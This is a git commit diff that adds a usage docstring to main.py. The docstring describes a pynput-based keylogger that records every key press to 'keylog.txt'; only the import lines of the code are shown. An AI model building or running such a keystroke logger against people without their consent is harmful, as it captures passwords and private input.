c48ce061b7b218967170c231168adf1ee8232aff
Drew <33384698+Ahendrix9624@users.noreply.github.com>
2023-03-11 14:20:39 -0700

    Update main.py

--- main.py
+++ main.py
@@ -1,3 +1,14 @@
+"""
+USAGE - This code imports the required modules for monitoring and logging keyboard input. 
+        It sets up a logging configuration and creates a function to log each key press. 
+        It then initializes a Listener object and starts listening for key presses. 
+        When a key is pressed, the on_press function is called, which logs the key press 
+        to a file called "keylog.txt" using the logging module. The listener continues 
+        running until it is stopped manually.
+        
+AUTHOR - https://github.com/Ahendrix9624/
+"""
+
 from pynput.keyboard import Key, Listener
 import logging
 
